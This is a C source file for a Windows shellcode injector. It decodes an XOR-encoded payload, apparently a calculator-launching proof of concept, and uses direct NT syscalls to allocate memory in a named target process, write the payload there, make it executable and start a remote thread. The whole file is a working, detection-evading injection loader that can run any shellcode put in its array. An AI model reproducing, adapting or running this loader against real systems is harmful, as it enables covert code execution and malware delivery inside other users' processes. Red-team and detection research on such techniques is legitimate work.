#include "DirectInject.h"
#include "syscalls.h"
#include <stdio.h>
#include <TlHelp32.h>

// calc
unsigned char joker[] = "\xce\x7a\xb1\xd6\xc2\xda\xf2\x32\x32\x32\x73\x63\x73\x62\x60\x63\x64\x7a\x03\xe0\x57\x7a\xb9\x60\x52\x7a\xb9\x60\x2a\x7a\xb9\x60\x12\x7a\xb9\x40\x62\x7a\x3d\x85\x78\x78\x7f\x03\xfb\x7a\x03\xf2\x9e\x0e\x53\x4e\x30\x1e\x12\x73\xf3\xfb\x3f\x73\x33\xf3\xd0\xdf\x60\x73\x63\x7a\xb9\x60\x12\xb9\x70\x0e\x7a\x33\xe2\xb9\xb2\xba\x32\x32\x32\x7a\xb7\xf2\x46\x55\x7a\x33\xe2\x62\xb9\x7a\x2a\x76\xb9\x72\x12\x7b\x33\xe2\xd1\x64\x7a\xcd\xfb\x73\xb9\x06\xba\x7a\x33\xe4\x7f\x03\xfb\x7a\x03\xf2\x9e\x73\xf3\xfb\x3f\x73\x33\xf3\x0a\xd2\x47\xc3\x7e\x31\x7e\x16\x3a\x77\x0b\xe3\x47\xea\x6a\x76\xb9\x72\x16\x7b\x33\xe2\x54\x73\xb9\x3e\x7a\x76\xb9\x72\x2e\x7b\x33\xe2\x73\xb9\x36\xba\x7a\x33\xe2\x73\x6a\x73\x6a\x6c\x6b\x68\x73\x6a\x73\x6b\x73\x68\x7a\xb1\xde\x12\x73\x60\xcd\xd2\x6a\x73\x6b\x68\x7a\xb9\x20\xdb\x65\xcd\xcd\xcd\x6f\x7a\x88\x33\x32\x32\x32\x32\x32\x32\x32\x7a\xbf\xbf\x33\x33\x32\x32\x73\x88\x03\xb9\x5d\xb5\xcd\xe7\x89\xd2\x2f\x18\x38\x73\x88\x94\xa7\x8f\xaf\xcd\xe7\x7a\xb1\xf6\x1a\x0e\x34\x4e\x38\xb2\xc9\xd2\x47\x37\x89\x75\x21\x40\x5d\x58\x32\x6b\x73\xbb\xe8\xcd\xe7\x51\x53\x5e\x51\x1c\x57\x4a\x57\x32\x32";
SIZE_T joker_len = sizeof(joker);
char key = '2';

// Debug Symbols
char ok[6] = "\n(+)";
char in[6] = "\n\t(*)";
char err[6] = "\n(-)";
char ar[12] = "---------->";

int FindTarget(LPCWSTR procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcSnap == INVALID_HANDLE_VALUE) {
        printf("%s Failed to take snapshot, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {

        printf("%s Failed to parse snapshot, error: %ld", err, GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpW(pe32.szExeFile, procname) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    return pid;
}

int Decrypt() {
    int i = 0;
    for (i; i < sizeof(joker) - 1; i++)
    {
        joker[i] = joker[i] ^ key;
    }

    return EXIT_SUCCESS;
}

int wmain(int argc, wchar_t* argv[]) {
	
	if (argc != 2 || !argv[1] || argv[1] == NULL) {
		printf("%s Usage: %s <process name>", err, argv[0]);
		return EXIT_FAILURE;
	}

    NTSTATUS status;
    HANDLE hProc, hThread;
    LPVOID rBaseAddress = NULL;
    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjectAttributes;
    ULONG OldProtect = NULL;

    LPCWSTR procname = argv[1];
    //LPCWSTR procname = L"notepad.exe";

    DWORD pid = FindTarget(procname);
    if (pid == 0 || pid == EXIT_FAILURE) {
        printf("%s Failed to find pid for %ls, are you sure its running?", err, procname);
        return EXIT_FAILURE;
    }

    printf("%s Retrieved pid for %ls: %d", ok, procname, pid);

    printf("%s Decoding %zu bytes...", ok, sizeof(joker));
    Decrypt();
    printf("%s Decoded %zu bytes...", in, sizeof(joker));

    ClientId = { (HANDLE)pid, NULL };
    ObjectAttributes = { sizeof(ObjectAttributes) };


    status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
    if (!hProc || hProc == NULL || status != 0) {
        printf("%s Failed to open handle to %s [%d], error: %ld", ok, procname, pid, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s NtOpenProcess() %s Got handle to %s [%d]", ok, ar, procname, pid);
    
    status = NtAllocateVirtualMemory(hProc, &rBaseAddress, 0, &joker_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%s NtAllocateVirtualMemory() %s Allocated %zu bytes in %s %s 0x%lp", ok, ar, joker_len, procname, ar, rBaseAddress);


    status = NtWriteVirtualMemory(hProc, rBaseAddress, joker, sizeof(joker), NULL);
    printf("%s NtWriteVirtualMemory() %s Wrote %zu bytes in %s", ok, ar, sizeof(joker), procname);

    status = NtProtectVirtualMemory(hProc, &rBaseAddress, &joker_len, PAGE_EXECUTE_READ, &OldProtect);
    if (!OldProtect || OldProtect == NULL) {
        printf("%s NtProtectVirtualMemory() Failed to change memory protection at 0x%p from PAGE_READWRITE to PAGE_EXECUTEREAD, error: %ld", err, rBaseAddress, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s NtProtectVirtualMemory() %s Changed memory protection at 0x%p from PAGE_READWRITE to PAGE_EXECUTE_READ", ok, ar, rBaseAddress);

    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &ObjectAttributes, hProc, rBaseAddress, NULL, 0, 0, 0, 0, NULL);
    if (!hThread || hThread == NULL) {
        printf("%s Failed to create thread, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s NtCreateThreadEx() %s Created thread at 0x%p", ok, ar, rBaseAddress);

    printf("%s WaitForSingleObject() %s Waiting for execution to complete...", in, ar);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s WaitForSingleObject() %s Thread execution complete", in, ar);

    printf("%s Cleaning up...", ok);
    NtClose(hThread);
    printf("%s NtClose() %s Closed handle to thread", ok, ar);
    NtClose(hProc);
    printf("%s NtClose() %s Closed handle to %s", ok, ar, procname);

    printf("%s Done", ok);

    return EXIT_SUCCESS;
}